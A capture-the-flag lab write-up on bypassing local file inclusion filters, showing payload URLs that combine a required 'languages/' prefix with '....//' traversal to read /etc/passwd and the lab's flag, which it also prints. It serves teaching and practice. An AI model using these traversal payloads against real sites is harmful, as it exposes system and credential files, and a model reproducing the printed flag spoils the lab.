# Basic Bypasses - Lab Writeup

## [¤] Operation Log (Proof of Concept)

```yaml
Target Host: 10.129.x.x
System/OS: Linux / Windows
Objective: Find the Flag
Vulnerability: LFI Bypass (e.g., Non-recursive stripping / Encoding / Null Byte)
```

### 1. Reconnaissance & Foothold
- **Initial Verification**:
  - A standard directory traversal attempt (`/index.php?language=../../../../etc/passwd`) returned the error: `"Illegal path specified!"`.
  - Attempting to bypass non-recursive stripping with `....//....//....//....//etc/passwd` also returned `"Illegal path specified!"`.
  - Testing URL-encoded payloads resulted in the same error message.
- **Analysis of Filters**:
  - The application implements multiple filters:
    1. **Prefix Enforcement**: It verifies that the input begins with a specific directory (in this case, `languages/`).
    2. **Non-Recursive Traversal Stripping**: It searches for and strips the string `../`.
- **Bypass Strategy**:
  - Prepend the required prefix `languages/`.
  - Use the non-recursive traversal bypass payload `....//` which, when `../` is stripped out, collapses into `../`.
  - Final test URL: `/index.php?language=languages/....//....//....//....//etc/passwd`
  - **Result**: Successfully read the contents of `/etc/passwd`.

### 2. Exploitation (Bypassing the Filter & Flag)
- **Objective**: Retrieve `/flag.txt`.
- **Exploitation Payload**:
  We construct the payload with the prefix check bypass and the traversal bypass targeting the root file system:
  ```http
  GET /index.php?language=languages/....//....//....//....//flag.txt HTTP/1.1
  ```
- **Result**: The server processed the input, bypassed both filters, and rendered the flag content on the screen.

### 3. Post-Mortem & Flag
* **Flag**: `HTB{64$!c_f!lt3r$_w0nt_$t0p_lf!}` 
* **Lessons Learned**:
  - When encountering "Illegal path" errors, verify if the application is expecting a specific path prefix (e.g., checking if the input starts with `languages/` or `templates/`).
  - Layered security mechanisms can be bypassed by combining bypass techniques (prefix insertion + recursive traversal payload).
